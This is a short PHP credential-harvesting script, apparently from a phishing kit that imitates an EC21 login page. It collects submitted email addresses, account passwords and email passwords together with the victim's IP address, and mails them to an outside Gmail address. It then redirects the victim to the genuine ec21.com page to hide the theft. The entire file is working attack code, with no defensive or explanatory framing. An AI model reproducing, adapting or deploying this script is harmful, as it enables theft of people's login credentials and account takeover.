<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------------Spam ReSulT--------------------\n";
$message .= "Email Address  : ".$_POST['user_id']."\n";
$message .= "password : ".$_POST['user_pw']."\n";
$message .= "Email Password : ".$_POST['em_pw']."\n";
$message .= "----------------created by n0b0dy-------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "-----------------Spam ReSulT--------------------\n";
$send = "bahijahgkayali@gmail.com";
$subject = "ReZulTs";
$headers = "From: ReZult<logzz@cok.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers);
?>
<script>
    window.top.location.href = "https://www.ec21.com/mobile/mobileWeb.jsp";

</script>